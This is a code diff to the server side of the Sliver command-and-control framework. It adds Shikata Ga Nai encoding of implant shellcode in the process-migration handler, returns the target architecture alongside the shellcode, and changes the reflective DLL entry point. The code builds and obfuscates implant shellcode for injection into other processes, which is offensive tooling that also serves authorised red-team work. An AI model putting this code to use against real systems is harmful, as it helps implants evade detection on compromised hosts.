@@ -24,7 +24,7 @@ import (
 	"encoding/binary"
 	"fmt"
 	"os"
-	"path"
+	"path/filepath"
 	"strings"
 
 	"github.com/Binject/debug/pe"
@@ -37,7 +37,10 @@ import (
 	"github.com/bishopfox/sliver/server/db/models"
 	"github.com/bishopfox/sliver/server/generate"
 	"github.com/bishopfox/sliver/server/log"
+	"github.com/bishopfox/sliver/server/sgn"
 
+	"google.golang.org/grpc/codes"
+	"google.golang.org/grpc/status"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -62,8 +65,8 @@ func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliv
 	if session == nil {
 		return nil, ErrInvalidSessionID
 	}
-	name := path.Base(req.Config.GetName())
-	shellcode, err := getSliverShellcode(name)
+	name := filepath.Base(req.Config.GetName())
+	shellcode, arch, err := getSliverShellcode(name)
 	if err != nil {
 		name, config := generate.ImplantConfigFromProtobuf(req.Config)
 		if name == "" {
@@ -79,7 +82,23 @@ func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliv
 			return nil, err
 		}
 		shellcode, _ = os.ReadFile(shellcodePath)
+		arch = config.GOARCH
 	}
+
+	if len(shellcode) < 1 {
+		return nil, status.Error(codes.OutOfRange, "shellcode is zero bytes")
+	}
+
+	switch req.Encoder {
+
+	case clientpb.ShellcodeEncoder_SHIKATA_GA_NAI:
+		shellcode, err = sgn.EncodeShellcode(shellcode, arch, 1, []byte{})
+		if err != nil {
+			return nil, err
+		}
+
+	}
+
 	reqData, err := proto.Marshal(&sliverpb.InvokeMigrateReq{
 		Request: req.Request,
 		Data:    shellcode,
@@ -268,48 +287,53 @@ func getOS(session *core.Session, beacon *models.Beacon) string {
 }
 
 // Utility functions
-func getSliverShellcode(name string) ([]byte, error) {
+func getSliverShellcode(name string) ([]byte, string, error) {
 	var data []byte
 	build, err := db.ImplantBuildByName(name)
 	if err != nil {
-		return nil, err
+		return nil, "", err
 	}
 
 	switch build.ImplantConfig.Format {
+
 	case clientpb.OutputFormat_SHELLCODE:
 		fileData, err := generate.ImplantFileFromBuild(build)
 		if err != nil {
-			return data, err
+			return []byte{}, "", err
 		}
 		data = fileData
+
 	case clientpb.OutputFormat_EXECUTABLE:
 		// retrieve EXE from db
 		fileData, err := generate.ImplantFileFromBuild(build)
 		rpcLog.Debugf("Found implant. Len: %d\n", len(fileData))
 		if err != nil {
-			return data, err
+			return []byte{}, "", err
 		}
 		data, err = generate.DonutShellcodeFromPE(fileData, build.ImplantConfig.GOARCH, false, "", "", "", false, false)
 		if err != nil {
 			rpcLog.Errorf("DonutShellcodeFromPE error: %v\n", err)
-			return data, err
+			return []byte{}, "", err
 		}
+
 	case clientpb.OutputFormat_SHARED_LIB:
 		// retrieve DLL from db
 		fileData, err := generate.ImplantFileFromBuild(build)
 		if err != nil {
-			return data, err
+			return []byte{}, "", err
 		}
-		data, err = generate.ShellcodeRDIFromBytes(fileData, "RunSliver", "")
+		data, err = generate.ShellcodeRDIFromBytes(fileData, "StartW", "")
 		if err != nil {
-			return data, err
+			return []byte{}, "", err
 		}
+
 	case clientpb.OutputFormat_SERVICE:
 		fallthrough
 	default:
 		err = fmt.Errorf("no existing shellcode found")
 	}
-	return data, err
+
+	return data, build.ImplantConfig.GOARCH, err
 }
 
 // ExportDirectory - stores the Export data
